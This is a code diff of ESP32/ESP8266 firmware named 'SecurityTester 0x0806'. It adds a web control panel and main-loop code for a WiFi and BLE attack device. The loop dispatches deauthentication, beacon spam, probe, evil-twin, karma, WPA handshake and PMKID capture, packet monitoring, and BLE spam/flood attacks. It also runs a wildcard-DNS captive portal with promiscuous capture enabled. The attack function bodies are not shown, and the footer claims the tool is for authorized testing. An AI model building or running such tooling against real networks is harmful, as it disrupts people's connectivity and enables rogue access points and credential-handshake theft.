+                    <h3 class="card-title">System Status</h3>
+                    <span class="card-badge">Live</span>
+                </div>
+                <div class="status-indicator active" id="ap-status">
+                    <span>Access Point: Active</span>
+                    <div class="status-dot active"></div>
+                </div>
+                <div class="status-indicator" id="wifi-status">
+                    <span>WiFi Attack: Standby</span>
+                    <div class="status-dot"></div>
+                </div>
+                <div class="status-indicator" id="ble-status">
+                    <span>BLE Attack: Standby</span>
+                    <div class="status-dot"></div>
+                </div>
+                <div class="status-indicator" id="monitor-status">
+                    <span>Packet Monitor: Inactive</span>
+                    <div class="status-dot"></div>
+                </div>
+                <div class="status-indicator active" id="web-status">
+                    <span>Web Interface: Online</span>
+                    <div class="status-dot active"></div>
+                </div>
+            </div>
+        </div>
+
+        <div class="grid-2">
+            <div class="card">
+                <div class="card-header">
+                    <h3 class="card-title">Attack Statistics</h3>
+                    <button class="btn" onclick="resetStats()">Reset</button>
+                </div>
+                <div class="stats-grid">
+                    <div class="stat-item">
+                        <div class="stat-value" id="deauth-count">0</div>
+                        <div class="stat-label">Deauth Sent</div>
+                    </div>
+                    <div class="stat-item">
+                        <div class="stat-value" id="beacon-count">0</div>
+                        <div class="stat-label">Beacons Sent</div>
+                    </div>
+                    <div class="stat-item">
+                        <div class="stat-value" id="probe-count">0</div>
+                        <div class="stat-label">Probes Sent</div>
+                    </div>
+                    <div class="stat-item">
+                        <div class="stat-value" id="handshake-count">0</div>
+                        <div class="stat-label">Handshakes</div>
+                    </div>
+                    <div class="stat-item">
+                        <div class="stat-value" id="ble-count">0</div>
+                        <div class="stat-label">BLE Spam</div>
+                    </div>
+                    <div class="stat-item">
+                        <div class="stat-value" id="clients-count">0</div>
+                        <div class="stat-label">Connected</div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="card">
+                <div class="card-header">
+                    <h3 class="card-title">Activity Monitor</h3>
+                    <button class="btn" onclick="clearLogs()">Clear</button>
+                </div>
+                <div class="log-container" id="log-container">
+                    <div class="log-entry success">System initialized - SecurityTester 0x0806</div>
+                    <div class="log-entry">Access Point started successfully</div>
+                    <div class="log-entry">Web interface ready on port 80</div>
+                    <div class="log-entry">Platform detection completed</div>
+                    <div class="log-entry">All systems operational</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="footer">
+        <div class="footer-content">
+            <p style="font-size: 1.1rem; margin-bottom: 0.5rem;">
+                <strong>SecurityTester 0x0806</strong> - Professional Security Testing Platform
+            </p>
+            <p style="opacity: 0.7;">
+                Developed by 0x0806 | For Educational and Authorized Testing Only
+            </p>
+            <p style="font-size: 0.8rem; margin-top: 1rem; opacity: 0.5;">
+                Use responsibly and in compliance with local laws and regulations
+            </p>
+        </div>
+    </div>
+
+    <div id="toast" class="toast">
+        <div id="toast-message"></div>
+    </div>
+
+    <script>
+        var scanInterval, statsInterval, uptimeInterval;
+        var isScanning = false;
+        var isAttacking = false;
+        var selectedNetwork = null;
+        var systemUptime = 0;
+
+        function initMatrix() {
+            var canvas = document.createElement("canvas");
+            var ctx = canvas.getContext("2d");
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+            document.getElementById("matrix-canvas").appendChild(canvas);
+
+            var chars = "0x0806ABCDEFabcdef0123456789";
+            var fontSize = 14;
+            var columns = canvas.width / fontSize;
+            var drops = [];
+
+            for (var x = 0; x < columns; x++) {
+                drops[x] = 1;
+            }
+
+            function draw() {
+                ctx.fillStyle = "rgba(15, 15, 35, 0.08)";
+                ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+                ctx.fillStyle = "#e94560";
+                ctx.font = fontSize + "px monospace";
+
+                for (var i = 0; i < drops.length; i++) {
+                    var text = chars[Math.floor(Math.random() * chars.length)];
+                    ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+
+                    if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
+                        drops[i] = 0;
+                    }
+                    drops[i]++;
+                }
+            }
+
+            setInterval(draw, 50);
+
+            window.addEventListener("resize", function() {
+                canvas.width = window.innerWidth;
+                canvas.height = window.innerHeight;
+            });
+        }
+
+        function showToast(message, type) {
+            type = type || "info";
+            var toast = document.getElementById("toast");
+            var toastMessage = document.getElementById("toast-message");
+            
+            toastMessage.textContent = message;
+            toast.className = "toast " + type + " show";
+            
+            setTimeout(function() {
+                toast.classList.remove("show");
+            }, 3000);
+        }
+
+        function addLog(message, type) {
+            type = type || "info";
+            var logContainer = document.getElementById("log-container");
+            var logEntry = document.createElement("div");
+            logEntry.className = "log-entry " + type;
+            logEntry.innerHTML = '<span style="opacity: 0.6;">[' + new Date().toLocaleTimeString() + ']</span> ' + message;
+            
+            logContainer.appendChild(logEntry);
+            logContainer.scrollTop = logContainer.scrollHeight;
+
+            while (logContainer.children.length > 50) {
+                logContainer.removeChild(logContainer.firstChild);
+            }
+        }
+
+        function updateProgress(elementId, percentage) {
+            var progressBar = document.getElementById(elementId);
+            if (progressBar) {
+                progressBar.style.width = percentage + "%";
+            }
+        }
+
+        function scanNetworks() {
+            if (isScanning) return;
+            
+            isScanning = true;
+            var scanBtn = document.getElementById("scan-btn");
+            var scanText = document.getElementById("scan-text");
+            var scanLoading = document.getElementById("scan-loading");
+            var scanBadge = document.getElementById("scan-badge");
+            
+            scanText.style.display = "none";
+            scanLoading.style.display = "inline-block";
+            scanBtn.disabled = true;
+            scanBadge.textContent = "Scanning";
+            
+            addLog("Starting comprehensive network scan...", "info");
+            
+            var progressCounter = 0;
+            var progressInterval = setInterval(function() {
+                if (progressCounter <= 100) {
+                    updateProgress("scan-progress", progressCounter);
+                    progressCounter += 5;
+                } else {
+                    clearInterval(progressInterval);
+                }
+            }, 100);
+
+            fetch("/scan")
+                .then(function(response) { return response.json(); })
+                .then(function(data) {
+                    updateNetworkList(data.networks || []);
+                    addLog("Network scan completed - Found " + (data.networks ? data.networks.length : 0) + " networks", "success");
+                    showToast("Found " + (data.networks ? data.networks.length : 0) + " networks", "success");
+                })
+                .catch(function(error) {
+                    addLog("Network scan failed: " + error.message, "error");
+                    showToast("Scan failed: " + error.message, "error");
+                })
+                .finally(function() {
+                    scanText.style.display = "inline-block";
+                    scanLoading.style.display = "none";
+                    scanBtn.disabled = false;
+                    scanBadge.textContent = "Ready";
+                    updateProgress("scan-progress", 0);
+                    isScanning = false;
+                });
+        }
+
+        function updateNetworkList(networks) {
+            var list = document.getElementById("network-list");
+            list.innerHTML = "";
+            
+            if (networks.length === 0) {
+                list.innerHTML = '<div style="text-align: center; padding: 2rem; color: var(--text-secondary);">No networks found. Try scanning again.</div>';
+                return;
+            }
+            
+            networks.forEach(function(network, index) {
+                var item = document.createElement("div");
+                item.className = "network-item";
+                item.onclick = function() { selectNetwork(network, item); };
+                
+                var signalStrength = Math.abs(network.rssi);
+                var signalLevel = signalStrength > 70 ? 1 : signalStrength > 50 ? 2 : signalStrength > 30 ? 3 : 4;
+                
+                var signalBars = "";
+                for (var i = 0; i < 4; i++) {
+                    var isActive = i < signalLevel ? "active" : "";
+                    var height = (i + 1) * 3;
+                    signalBars += '<div class="signal-bar ' + isActive + '" style="height: ' + height + 'px;"></div>';
+                }
+                
+                item.innerHTML = 
+                    '<div class="network-ssid">' + (network.ssid || "Hidden Network") + '</div>' +
+                    '<div class="network-details">' +
+                        '<span>CH: ' + network.channel + '</span>' +
+                        '<span>Security: ' + network.encryption + '</span>' +
+                        '<div class="signal-strength">' +
+                            '<span>' + network.rssi + ' dBm</span>' +
+                            '<div class="signal-bars">' + signalBars + '</div>' +
+                        '</div>' +
+                    '</div>' +
+                    '<div style="font-size: 0.75rem; opacity: 0.6; margin-top: 0.3rem;">' +
+                        'BSSID: ' + network.bssid +
+                    '</div>';
+                
+                list.appendChild(item);
+            });
+        }
+
+        function selectNetwork(network, element) {
+            var items = document.querySelectorAll(".network-item");
+            for (var i = 0; i < items.length; i++) {
+                items[i].classList.remove("selected");
+            }
+            element.classList.add("selected");
+            selectedNetwork = network;
+            
+            addLog("Target selected: " + (network.ssid || "Hidden") + " (" + network.bssid + ")", "info");
+            showToast("Target: " + (network.ssid || "Hidden"), "info");
+        }
+
+        function startAttack() {
+            var attackType = document.getElementById("attack-type").value;
+            var intensity = document.getElementById("attack-intensity").value;
+            
+            if (!selectedNetwork && attackType.indexOf("ble") === -1) {
+                showToast("Please select a target network first", "warning");
+                return;
+            }
+            
+            if (isAttacking) {
+                showToast("Attack already in progress", "warning");
+                return;
+            }
+            
+            isAttacking = true;
+            var attackBtn = document.getElementById("attack-start-btn");
+            var attackBadge = document.getElementById("attack-badge");
+            
+            attackBtn.disabled = true;
+            attackBadge.textContent = "Active";
+            
+            addLog("Starting " + attackType + " attack with " + intensity + " intensity...", "warning");
+            
+            var requestData = {
+                type: attackType,
+                target: selectedNetwork ? selectedNetwork.ssid : "",
+                bssid: selectedNetwork ? selectedNetwork.bssid : "",
+                channel: selectedNetwork ? selectedNetwork.channel : 0,
+                intensity: intensity
+            };
+
+            fetch("/attack/start", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(requestData)
+            })
+            .then(function(response) { return response.json(); })
+            .then(function(data) {
+                if (data.success) {
+                    addLog(attackType + " attack launched successfully", "success");
+                    showToast("Attack started successfully", "success");
+                    updateStatus("wifi-status", "WiFi Attack: Active", true);
+                    startAttackProgress();
+                } else {
+                    throw new Error(data.error || "Unknown error");
+                }
+            })
+            .catch(function(error) {
+                addLog("Failed to start attack: " + error.message, "error");
+                showToast("Attack failed: " + error.message, "error");
+                isAttacking = false;
+                attackBtn.disabled = false;
+                attackBadge.textContent = "Standby";
+            });
+        }
+
+        function stopAttack() {
+            fetch("/attack/stop", { method: "POST" })
+                .then(function(response) { return response.json(); })
+                .then(function(data) {
+                    addLog("Attack stopped by user", "info");
+                    showToast("Attack stopped", "info");
+                    
+                    isAttacking = false;
+                    document.getElementById("attack-start-btn").disabled = false;
+                    document.getElementById("attack-badge").textContent = "Standby";
+                    updateStatus("wifi-status", "WiFi Attack: Standby", false);
+                    updateStatus("ble-status", "BLE Attack: Standby", false);
+                    updateProgress("attack-progress", 0);
+                })
+                .catch(function(error) {
+                    addLog("Failed to stop attack: " + error.message, "error");
+                    showToast("Failed to stop attack", "error");
+                });
+        }
+
+        function startAttackProgress() {
+            var progress = 0;
+            var interval = setInterval(function() {
+                if (!isAttacking) {
+                    clearInterval(interval);
+                    updateProgress("attack-progress", 0);
+                    return;
+                }
+                
+                progress = (progress + 2) % 100;
+                updateProgress("attack-progress", progress);
+            }, 100);
+        }
+
+        function updateStatus(elementId, text, active) {
+            var element = document.getElementById(elementId);
+            if (element) {
+                element.querySelector("span").textContent = text;
+                var dot = element.querySelector(".status-dot");
+                
+                if (active) {
+                    element.classList.add("active");
+                    dot.classList.add("active");
+                } else {
+                    element.classList.remove("active");
+                    dot.classList.remove("active");
+                }
+            }
+        }
+
+        function updateStats() {
+            fetch("/stats")
+                .then(function(response) { return response.json(); })
+                .then(function(data) {
+                    document.getElementById("deauth-count").textContent = data.deauth_sent || 0;
+                    document.getElementById("beacon-count").textContent = data.beacon_sent || 0;
+                    document.getElementById("probe-count").textContent = data.probe_sent || 0;
+                    document.getElementById("handshake-count").textContent = data.handshakes_captured || 0;
+                    document.getElementById("ble-count").textContent = data.ble_spam_sent || 0;
+                    document.getElementById("clients-count").textContent = data.clients_connected || 0;
+                    
+                    if (data.memory_usage !== undefined) {
+                        document.getElementById("memory-usage").textContent = "RAM: " + data.memory_usage.toFixed(1) + "%";
+                    }
+                })
+                .catch(function(error) {
+                    console.error("Failed to update stats:", error);
+                });
+        }
+
+        function updateUptime() {
+            systemUptime++;
+            var hours = Math.floor(systemUptime / 3600);
+            var minutes = Math.floor((systemUptime % 3600) / 60);
+            var seconds = systemUptime % 60;
+            
+            var uptimeStr = 
+                String(hours).padStart(2, "0") + ":" +
+                String(minutes).padStart(2, "0") + ":" +
+                String(seconds).padStart(2, "0");
+                
+            document.getElementById("uptime-display").textContent = "Uptime: " + uptimeStr;
+        }
+
+        function getPlatformInfo() {
+            fetch("/info")
+                .then(function(response) { return response.json(); })
+                .then(function(data) {
+                    document.getElementById("platform-info").textContent = "Platform: " + (data.platform || "Unknown");
+                    
+                    if (data.features) {
+                        addLog("Platform features: " + data.features.join(", "), "info");
+                    }
+                })
+                .catch(function(error) {
+                    document.getElementById("platform-info").textContent = "Platform: Detection Failed";
+                });
+        }
+
+        function scanBLE() {
+            addLog("Starting BLE device scan...", "info");
+            showToast("BLE scan started", "info");
+            
+            fetch("/ble/scan")
+                .then(function(response) { return response.json(); })
+                .then(function(data) {
+                    addLog("BLE scan completed - Found " + (data.devices ? data.devices.length : 0) + " devices", "success");
+                    showToast("Found " + (data.devices ? data.devices.length : 0) + " BLE devices", "success");
+                })
+                .catch(function(error) {
+                    addLog("BLE scan failed: " + error.message, "error");
+                    showToast("BLE scan failed", "error");
+                });
+        }
+
+        function resetStats() {
+            fetch("/stats/reset", { method: "POST" })
+                .then(function(response) {
+                    addLog("Statistics reset", "info");
+                    showToast("Statistics reset", "info");
+                    updateStats();
+                })
+                .catch(function(error) {
+                    showToast("Failed to reset statistics", "error");
+                });
+        }
+
+        function clearLogs() {
+            document.getElementById("log-container").innerHTML = "";
+            addLog("Logs cleared", "info");
+        }
+
+        document.addEventListener("DOMContentLoaded", function() {
+            initMatrix();
+            getPlatformInfo();
+            
+            addLog("SecurityTester 0x0806 interface loaded", "success");
+            addLog("All systems operational and ready", "success");
+            
+            setTimeout(scanNetworks, 2000);
+            
+            statsInterval = setInterval(updateStats, 2000);
+            uptimeInterval = setInterval(updateUptime, 1000);
+            
+            updateStats();
+        });
+
+        window.addEventListener("beforeunload", function() {
+            if (isAttacking) {
+                stopAttack();
+            }
+        });
+    </script>
 </body>
-</html>
-)";
+</html>)rawliteral";
 
+// Function Declarations
+void setupCore();
+void setupWiFiAP();
+void setupWebServer();
+void setupBLE();
+void setupWatchdog();
+void handleRoot();
+void handleScan();
+void handleAttackStart();
+void handleAttackStop();
+void handleStats();
+void handleStatsReset();
+void handleInfo();
+void handleBLEScan();
+void handleNotFound();
+void scanWiFiNetworks();
+void performDeauthAttack();
+void performBeaconSpam();
+void performProbeAttack();
+void performEvilTwin();
+void performKarmaAttack();
+void performHandshakeCapture();
+void performPMKIDCapture();
+void performPacketMonitor();
+void performBLESpam();
+void performBLEFlood();
+void updateAttackStats();
+void updateSystemStats();
+String getEncryptionType(int encType);
+#ifdef PLATFORM_ESP32
+void promiscuous_callback(void *buf, wifi_promiscuous_pkt_type_t type);
+#else
+void promiscuous_callback(uint8_t *buf, uint16_t len);
+#endif
+void optimizeMemory();
+void checkSystemHealth();
+
+// Setup Function
 void setup() {
   Serial.begin(115200);
-  delay(3000);  // Increased delay for proper initialization
-
-  Serial.println("\n=================================");
-  Serial.println("WiFi & BLE Security Tester v2.0");
+  delay(1000);
+  
+  Serial.println();
+  for(int i = 0; i < 50; i++) Serial.print("=");
+  Serial.println();
+  Serial.println("SecurityTester 0x0806 v3.0 - Production");
+  Serial.println("Advanced WiFi & BLE Security Platform");
   Serial.println("Developed by 0x0806");
+  for(int i = 0; i < 50; i++) Serial.print("=");
+  Serial.println();
 
 #ifdef PLATFORM_ESP32
-  Serial.println("Platform: ESP32 (Dual-band + BLE)");
+  Serial.println("Platform: ESP32 Detected");
+  Serial.println("Features: WiFi 2.4/5GHz + BLE + Dual Core");
   
-  // ESP32 specific power management
-  esp_wifi_set_ps(WIFI_PS_NONE);  // Disable power saving
+  // ESP32 specific optimizations
+  esp_task_wdt_init(30, true);
+  esp_task_wdt_add(NULL);
+  
+  // Initialize NVS
+  esp_err_t ret = nvs_flash_init();
+  if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
+    ESP_ERROR_CHECK(nvs_flash_erase());
+    ret = nvs_flash_init();
+  }
+  ESP_ERROR_CHECK(ret);
+  
 #else
-  Serial.println("Platform: ESP8266 (2.4GHz only)");
+  Serial.println("Platform: ESP8266 Detected");
+  Serial.println("Features: WiFi 2.4GHz + Enhanced Attacks");
   
-  // ESP8266 specific settings
-  wifi_set_sleep_type(NONE_SLEEP_T);  // Disable sleep mode
-  system_phy_set_powerup_option(3);   // Full power on startup
+  // ESP8266 specific optimizations
+  system_update_cpu_freq(160);
+  wifi_set_sleep_type(NONE_SLEEP_T);
 #endif
-  Serial.println("=================================\n");
 
-  // Initialize filesystem
+  setupCore();
+  setupWiFiAP();
+  setupWebServer();
+  
+#ifdef PLATFORM_ESP32
+  setupBLE();
+#endif
+
+  setupWatchdog();
+  optimizeMemory();
+  
+  Serial.println();
+  for(int i = 0; i < 30; i++) Serial.print("=");
+  Serial.println();
+  Serial.println("SYSTEM READY");
+  Serial.printf("AP SSID: %s\n", AP_SSID);
+  Serial.printf("AP Password: %s\n", AP_PASS);
+  Serial.printf("Web Interface: http://%s\n", AP_IP.toString().c_str());
+  Serial.printf("Free Heap: %d bytes\n", ESP.getFreeHeap());
+  for(int i = 0; i < 30; i++) Serial.print("=");
+  Serial.println();
+}
+
+// Main Loop
+void loop() {
+  static unsigned long last_stats_update = 0;
+  static unsigned long last_health_check = 0;
+  
+  // Handle web server
+  server.handleClient();
+  dnsServer.processNextRequest();
+  
+#ifdef PLATFORM_ESP32
+  esp_task_wdt_reset();
+#endif
+  
+  // Update system statistics
+  if (millis() - last_stats_update > 1000) {
+    updateSystemStats();
+    last_stats_update = millis();
+  }
+  
+  // System health check
+  if (millis() - last_health_check > 10000) {
+    checkSystemHealth();
+    last_health_check = millis();
+  }
+  
+  // Execute attacks if active
+  if (attack_running && (millis() - last_attack_time > attack_interval)) {
+    if (attack_type == "deauth") {
+      performDeauthAttack();
+    } else if (attack_type == "beacon") {
+      performBeaconSpam();
+    } else if (attack_type == "probe") {
+      performProbeAttack();
+    } else if (attack_type == "evil_twin") {
+      performEvilTwin();
+    } else if (attack_type == "karma") {
+      performKarmaAttack();
+    } else if (attack_type == "handshake") {
+      performHandshakeCapture();
+    } else if (attack_type == "pmkid") {
+      performPMKIDCapture();
+    } else if (attack_type == "monitor") {
+      performPacketMonitor();
+    }
+#ifdef PLATFORM_ESP32
+    else if (attack_type == "ble_spam") {
+      performBLESpam();
+    } else if (attack_type == "ble_flood") {
+      performBLEFlood();
+    }
+#endif
+    
+    last_attack_time = millis();
+  }
+  
+  delay(1);
+}
+
+// Core Setup
+void setupCore() {
+  // Initialize file system
 #ifdef PLATFORM_ESP32
   if (!SPIFFS.begin(true)) {
-#else
-  if (!SPIFFS.begin()) {
-#endif
     Serial.println("SPIFFS initialization failed!");
   }
-
-  // Complete WiFi reset and initialization
-  Serial.println("Initializing WiFi subsystem...");
-  
-#ifdef PLATFORM_ESP32
-  WiFi.mode(WIFI_OFF);
-  delay(1000);
-  
-  // ESP32 specific initialization
-  esp_wifi_stop();
-  esp_wifi_deinit();
-  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
-  esp_wifi_init(&cfg);
-  esp_wifi_set_mode(WIFI_MODE_AP);
-  esp_wifi_start();
-  delay(1000);
 #else
-  // ESP8266 specific initialization
-  WiFi.persistent(false);  // Don't save WiFi config to flash
-  WiFi.mode(WIFI_OFF);
-  delay(1000);
-  wifi_fpm_close();  // Close force sleep
-  delay(500);
+  if (!SPIFFS.begin()) {
+    Serial.println("SPIFFS initialization failed!");
+  }
 #endif
 
-  // Configure AP settings
-  WiFi.mode(WIFI_AP);
-  delay(1000);
+  // Initialize random seed
+  randomSeed(analogRead(0) + millis());
+  
+  // Clear statistics
+  memset(&stats, 0, sizeof(stats));
+  
+  Serial.println("Core systems initialized");
+}
 
-  IPAddress apIP(192, 168, 4, 1);
-  IPAddress gateway(192, 168, 4, 1);
-  IPAddress subnet(255, 255, 255, 0);
+// WiFi Access Point Setup
+void setupWiFiAP() {
+  WiFi.mode(WIFI_AP_STA);
+  delay(100);
   
-  // Configure IP settings before starting AP
-  if (!WiFi.softAPConfig(apIP, gateway, subnet)) {
-    Serial.println("ERROR: Failed to configure AP IP settings!");
-  }
+  // Configure AP
+  WiFi.softAPConfig(AP_IP, GATEWAY, SUBNET);
   
-  delay(500);
-
-  // Complete WiFi reset before starting AP
-  WiFi.softAPdisconnect(true);
-  WiFi.disconnect(true);
-  delay(2000);
+  bool ap_result = WiFi.softAP(AP_SSID, AP_PASS, AP_CHANNEL, false, 8);
   
-  // Start access point with robust settings
-  bool apStarted = false;
-  int attempts = 0;
-  
-  while (!apStarted && attempts < 10) {
-    attempts++;
-    Serial.println("AP Start Attempt " + String(attempts) + "...");
-    
-    // Force complete reset between attempts
-    WiFi.mode(WIFI_OFF);
-    delay(1000);
-    WiFi.mode(WIFI_AP);
-    delay(1000);
-    
-#ifdef PLATFORM_ESP32
-    apStarted = WiFi.softAP(AP_SSID, AP_PASS, 1, false, 8);  // Channel 1, max 8 clients
-#else
-    apStarted = WiFi.softAP(AP_SSID, AP_PASS, 1, false);     // Channel 1
-#endif
-    
-    if (!apStarted) {
-      Serial.println("AP start failed, performing hard reset...");
-      WiFi.softAPdisconnect(true);
-      delay(3000);
-    } else {
-      delay(2000);  // Allow AP to fully stabilize
-      
-      // Verify AP is actually working
-      if (WiFi.softAPIP() == IPAddress(0, 0, 0, 0)) {
-        Serial.println("AP IP not assigned, retrying...");
-        apStarted = false;
-        WiFi.softAPdisconnect(true);
-        delay(3000);
-      } else {
-        // Double-check AP is actually broadcasting
-        delay(1000);
-        if (WiFi.softAPgetStationNum() >= 0) {  // If we can get station count, AP is working
-          Serial.println("AP verification successful");
-        } else {
-          Serial.println("AP verification failed, retrying...");
-          apStarted = false;
-          WiFi.softAPdisconnect(true);
-          delay(3000);
-        }
-      }
-    }
-  }
-
-  if (apStarted) {
-    Serial.println("✅ Access Point Started Successfully!");
-    Serial.println("SSID: " + String(AP_SSID));
-    Serial.println("Password: " + String(AP_PASS));
-    Serial.println("IP Address: " + WiFi.softAPIP().toString());
-    Serial.println("MAC Address: " + WiFi.softAPmacAddress());
-    Serial.println("Channel: 6");
-    
-    // Additional verification
-    delay(2000);
-    if (WiFi.getMode() == WIFI_AP || WiFi.getMode() == WIFI_AP_STA) {
-      Serial.println("✅ AP Mode Confirmed Active");
-    } else {
-      Serial.println("❌ AP Mode Verification Failed");
-    }
+  if (ap_result) {
+    Serial.printf("Access Point: %s [STARTED]\n", AP_SSID);
+    Serial.printf("IP Address: %s\n", AP_IP.toString().c_str());
+    Serial.printf("Channel: %d\n", AP_CHANNEL);
+    ap_running = true;
   } else {
-    Serial.println("❌ CRITICAL: Failed to start Access Point after 5 attempts!");
-    Serial.println("Performing emergency restart...");
-    delay(5000);
-    ESP.restart();
+    Serial.println("Access Point: [FAILED]");
+    // Retry with different settings
+    delay(1000);
+    ap_result = WiFi.softAP(AP_SSID, AP_PASS, 1, false, 4);
+    if (ap_result) {
+      Serial.println("Access Point: [RETRY SUCCESS]");
+      ap_running = true;
+    }
   }
-
-  // Setup DNS server for captive portal
-  dnsServer.start(DNS_PORT, "*", apIP);
-
-  // Setup web server routes
-  setupWebServer();
-
+  
+  // Start DNS server for captive portal
+  dnsServer.start(53, "*", AP_IP);
+  
+  // Enable promiscuous mode for packet capture
 #ifdef PLATFORM_ESP32
-  // Initialize BLE
-  initializeBLE();
-
-  // Create FreeRTOS tasks for dual-core operation
-  xTaskCreatePinnedToCore(
-    wifiAttackTaskFunction,
-    "WiFiAttack",
-    4096,
-    NULL,
-    1,
-    &wifiAttackTask,
-    0  // Core 0
-  );
-
-  xTaskCreatePinnedToCore(
-    bleAttackTaskFunction,
-    "BLEAttack", 
-    4096,
-    NULL,
-    1,
-    &bleAttackTask,
-    1  // Core 1
-  );
-#endif
-
-  // Configure WiFi for packet injection without breaking AP mode
-#ifdef PLATFORM_ESP32
-  // Don't enable promiscuous mode immediately as it can interfere with AP
-  Serial.println("Packet injection ready (will enable during attacks)");
+  esp_wifi_set_promiscuous(true);
+  esp_wifi_set_promiscuous_rx_cb(&promiscuous_callback);
 #else
-  // For ESP8266, only enable promiscuous mode during attacks
-  Serial.println("Packet injection ready (will enable during attacks)");
+  wifi_promiscuous_enable(1);
+  wifi_set_promiscuous_rx_cb(promiscuous_callback);
 #endif
 
-  Serial.println("Security Tester Ready!");
-  performInitialScan();
+  Serial.println("WiFi and DNS configured");
 }
 
-void loop() {
-  static unsigned long lastAPCheck = 0;
-  static unsigned long lastStatusPrint = 0;
-  static unsigned long lastClientCheck = 0;
-
-  dnsServer.processNextRequest();
-  server.handleClient();
-
-  // Enhanced AP monitoring every 3 seconds
-  if (millis() - lastAPCheck > 3000) {
-    lastAPCheck = millis();
-
-    // Check if AP mode is active with platform-specific handling
-#ifdef PLATFORM_ESP32
-    wifi_mode_t currentMode = WiFi.getMode();
-    bool apModeActive = (currentMode == WIFI_AP || currentMode == WIFI_AP_STA);
-#else
-    uint8_t currentMode = wifi_get_opmode();
-    bool apModeActive = (currentMode == SOFTAP_MODE || currentMode == STATIONAP_MODE);
-#endif
-
-    // Verify AP IP is still valid
-    IPAddress currentIP = WiFi.softAPIP();
-    String currentSSID = WiFi.softAPSSID();
-    
-    if (!apModeActive || currentIP == IPAddress(0, 0, 0, 0) || currentSSID != AP_SSID) {
-      Serial.println("⚠️ CRITICAL: AP mode compromised! Mode: " + String(apModeActive) + " IP: " + currentIP.toString() + " SSID: " + currentSSID);
-      
-      // Force complete AP reset
-      WiFi.softAPdisconnect(true);
-      WiFi.disconnect(true);
-      delay(2000);
-      
-      // Reconfigure IP settings
-      IPAddress apIP(192, 168, 4, 1);
-      IPAddress gateway(192, 168, 4, 1);
-      IPAddress subnet(255, 255, 255, 0);
-      
-      WiFi.mode(WIFI_OFF);
-      delay(1000);
-      WiFi.mode(WIFI_AP);
-      delay(1000);
-      
-      if (!WiFi.softAPConfig(apIP, gateway, subnet)) {
-        Serial.println("❌ IP configuration failed!");
-      }
-      
-      // Restart AP with original settings
-#ifdef PLATFORM_ESP32
-      bool recovered = WiFi.softAP(AP_SSID, AP_PASS, 1, false, 8);
-#else
-      bool recovered = WiFi.softAP(AP_SSID, AP_PASS, 1, false);
-#endif
-      
-      if (recovered && WiFi.softAPIP() != IPAddress(0, 0, 0, 0)) {
-        Serial.println("✅ AP mode recovered successfully");
-        Serial.println("✅ SSID: " + String(AP_SSID));
-        Serial.println("✅ IP: " + WiFi.softAPIP().toString());
-      } else {
-        Serial.println("❌ AP recovery failed completely, restarting device...");
-        delay(5000);
-        ESP.restart();
-      }
-    }
-    
-    // Additional security check - verify SSID hasn't changed
-    if (currentSSID != AP_SSID && currentSSID.length() > 0) {
-      Serial.println("🚨 SECURITY ALERT: SSID changed to: " + currentSSID);
-      Serial.println("🚨 Forcing reset to prevent compromise...");
-      delay(2000);
-      ESP.restart();
-    }
-  }
-
-  // Check for client connections every 15 seconds
-  if (millis() - lastClientCheck > 15000) {
-    lastClientCheck = millis();
-    
-    uint8_t clientCount = WiFi.softAPgetStationNum();
-    if (clientCount > 0) {
-      Serial.println("📱 Active clients: " + String(clientCount));
-    }
-  }
-
-  // Print detailed status every 60 seconds
-  if (millis() - lastStatusPrint > 60000) {
-    lastStatusPrint = millis();
-    Serial.println("\n=== Detailed Status Report ===");
-    
-#ifdef PLATFORM_ESP32
-    Serial.println("WiFi Mode: " + String(WiFi.getMode()));
-#else
-    Serial.println("WiFi Mode: " + String(wifi_get_opmode()));
-#endif
-    
-    Serial.println("AP SSID: " + String(AP_SSID));
-    Serial.println("AP IP: " + WiFi.softAPIP().toString());
-    Serial.println("AP MAC: " + WiFi.softAPmacAddress());
-    Serial.println("Connected clients: " + String(WiFi.softAPgetStationNum()));
-    Serial.println("Uptime: " + String(millis()/1000) + " seconds");
-    Serial.println("Free heap: " + String(ESP.getFreeHeap()) + " bytes");
-    
-    if (attackRunning) {
-      Serial.println("Attack active: " + getAttackTypeName());
-      Serial.println("Packets sent: " + String(packetsCount));
-    }
-    Serial.println("==============================\n");
-  }
-
-  // Handle attacks with rate limiting
-  if (attackRunning) {
-    handleCurrentAttack();
-  }
-
-  // Prevent watchdog issues
-  yield();
-  delay(5);
-}
-
+// Web Server Setup
 void setupWebServer() {
-  // Main page
   server.on("/", HTTP_GET, handleRoot);
-
-  // API endpoints
   server.on("/scan", HTTP_GET, handleScan);
-  server.on("/attack", HTTP_POST, handleAttack);
-  server.on("/stop", HTTP_GET, handleStop);
+  server.on("/attack/start", HTTP_POST, handleAttackStart);
+  server.on("/attack/stop", HTTP_POST, handleAttackStop);
   server.on("/stats", HTTP_GET, handleStats);
-  server.on("/networks", HTTP_GET, handleNetworks);
-
-#ifdef PLATFORM_ESP32
-  server.on("/ble_scan", HTTP_GET, handleBLEScan);
-  server.on("/ble_attack", HTTP_POST, handleBLEAttack);
-  server.on("/ble_devices", HTTP_GET, handleBLEDevices);
-#endif
-
-  // Captive portal
-  server.onNotFound(handleRoot);
-
+  server.on("/stats/reset", HTTP_POST, handleStatsReset);
+  server.on("/info", HTTP_GET, handleInfo);
+  server.on("/ble/scan", HTTP_GET, handleBLEScan);
+  server.onNotFound(handleNotFound);
+  
+  // CORS headers
+  server.collectHeaders("User-Agent", "X-Requested-With");
+  
   server.begin();
-  Serial.println("Web server started");
+  Serial.println("Web server started on port 80");
 }
 
-void handleRoot() {
-  String html = HTML_HEADER;
-  html += CSS_STYLE;
-  html += "</head><body>";
-
-  html += "<div class='status'>Standby</div>";
-
-  html += "<div class='container'>";
-  html += "<div class='header'>";
-  html += "<h1>WiFi & BLE Security Tester</h1>";
-
 #ifdef PLATFORM_ESP32
-  html += "<div class='platform-badge'>ESP32 - Dual Band + BLE</div>";
-#else
-  html += "<div class='platform-badge'>ESP8266 - 2.4GHz WiFi</div>";
-#endif
-
-  html += "</div>";
